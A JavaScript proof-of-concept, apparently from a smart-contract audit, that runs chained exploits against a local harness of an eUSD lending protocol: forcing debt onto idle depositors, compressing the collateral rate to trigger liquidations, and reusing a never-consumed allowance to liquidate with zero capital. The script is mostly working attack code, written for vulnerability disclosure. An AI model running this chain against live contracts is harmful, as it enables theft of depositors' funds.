const { setup, E, addr } = require('./harness');
const pct = r => (Number(r / 10n ** 16n) / 100).toFixed(2) + '%';
const n = x => (Number(x * 100n / E) / 100).toLocaleString();

// CHAIN A: use the unconsented-mint bug (#1), uncapped via #4, to compress the PROTOCOL-WIDE
// collateral rate using other people's idle collateral -- the precondition superLiquidation needs.
(async () => {
  const t = await setup({ price: 2000n * E });
  const ATT = addr(0xA77);
  const idle = [], borrowers = [];
  for (let i = 0; i < 6; i++) { idle.push(addr(0x1000 + i)); borrowers.push(addr(0x2000 + i)); }
  for (const a of [ATT, ...idle, ...borrowers]) await t.fund(a, 10n ** 25n);

  // realistic mix: conservative borrowers + depositors sitting on idle collateral
  for (const b of borrowers) await t.depositEther(b, b, 50000n * E, 200n * E);   // 200 ETH @ 800%
  for (const v of idle)      await t.depositEther(v, v, 0, 500n * E);            // 500 ETH, NO debt

  const overall = async () => (await t.totalDeposited()) * (await t.price()) * 100n / (await t.totalSupply());
  const rate = async a => { const b = await t.borrowed(a); return b === 0n ? null : (await t.deposited(a)) * (await t.price()) * 100n / b; };
  const maxMintFor = async a => ((await t.deposited(a)) * (await t.price()) * 100n) / (160n * E);

  console.log('=== CHAIN A: compressing the system-wide collateral rate with OTHER PEOPLE\'S collateral ===\n');
  console.log('start: TVL', n(await t.totalDeposited()), 'ETH, circulation', n(await t.totalSupply()), 'eUSD');
  console.log('       overall collateral rate =', pct(await overall()), ' -> superLiquidation gate (<150%) is far away');
  console.log('       6 idle depositors hold 500 ETH each with ZERO debt: no liquidation exposure at all\n');

  let spent = 0n;
  for (const v of idle) {
    const m = await maxMintFor(v) - (await t.borrowed(v));
    await t.depositEther(ATT, v, m, 1n * E);     // attacker pays 1 ETH, victim takes the debt
    spent += 1n * E;
  }
  console.log('attacker force-mints each idle depositor to the 160% floor (1 ETH each, gifted):');
  console.log('       attacker total outlay   :', n(spent), 'ETH = $' + n(spent * 2000n));
  console.log('       circulation now         :', n(await t.totalSupply()), 'eUSD');
  console.log('       overall collateral rate :', pct(await overall()), ' <-- compressed toward the 160% floor\n');

  console.log('--- a routine 6.5% ETH move now puts every touched position under badCollateralRate ---');
  await t.setPrice(1870n * E);
  console.log('       overall rate @ $1870    :', pct(await overall()));
  let liquidatable = 0;
  for (const v of idle) if ((await rate(v)) < 150n * E) liquidatable++;
  console.log('       idle depositors now liquidatable:', liquidatable, '/', idle.length,
              '(before the attack: 0 -- liquidation() reverted on div-by-zero)');

  console.log('\n--- does cascading liquidation then drag the system under the superLiquidation gate? ---');
  // attacker funds a provider position to act as liquidation funder + keeper
  await t.depositEther(ATT, ATT, 3000000n * E, 20000n * E);
  await t.approveEUSD(ATT, t.lybra, 1n << 200n);
  const st0 = await t.stBal(ATT), eu0 = await t.eusdBal(ATT);
  for (const v of idle) { const d = await t.deposited(v); try { await t.liquidate(ATT, ATT, v, d / 2n); } catch (e) {} }
  console.log('       overall rate after mass liquidation:', pct(await overall()));
  const gain = ((await t.stBal(ATT)) - st0) * 1870n - (eu0 - (await t.eusdBal(ATT)));
  console.log('       attacker net on the liquidations   : $' + n(gain), '(vs $' + n(spent * 2000n), 'spent forcing the debt)');
  try { await t.superLiquidate(ATT, ATT, idle[0], 1n * E); console.log('       superLiquidation: OPEN'); }
  catch (e) { console.log('       superLiquidation gate still:', e.message); }

  console.log('\n=== CHAIN B: #3 (allowance never consumed) removes the capital requirement from #2 ===');
  const t2 = await setup({ price: 2000n * E });
  const POOR = addr(0xBAD), RICH = addr(0xDEF), VIC = addr(0xFEE);
  for (const a of [POOR, RICH, VIC]) await t2.fund(a, 10n ** 25n);
  await t2.depositEther(RICH, RICH, 2000000n * E, 10000n * E);
  await t2.approveEUSD(RICH, t2.lybra, 1n << 200n);          // RICH opts in as a liquidation provider, once
  await t2.depositEther(VIC, VIC, 125000n * E, 100n * E);
  await t2.setPrice(1870n * E);
  console.log('attacker eUSD balance:', n(await t2.eusdBal(POOR)), ' stETH:', n(await t2.stBal(POOR)), '-- zero capital');
  const ps0 = await t2.stBal(POOR);
  await t2.liquidate(POOR, RICH, VIC, (await t2.deposited(VIC)) / 2n);
  console.log('attacker calls liquidation(provider=RICH, ...) drafting RICH\'s standing allowance:');
  console.log('   attacker gained:', n((await t2.stBal(POOR)) - ps0), 'stETH = $' + n(((await t2.stBal(POOR)) - ps0) * 1870n), 'for 0 capital');
  console.log('   RICH\'s allowance after use:', n(await t2.ch.view(t2.lybra, require('./lib').enc('allowance(address,address)', [RICH, t2.lybra]))), '(never decremented -> reusable forever)');
})().catch(e => { console.error('ERR', e.message); process.exit(1); });
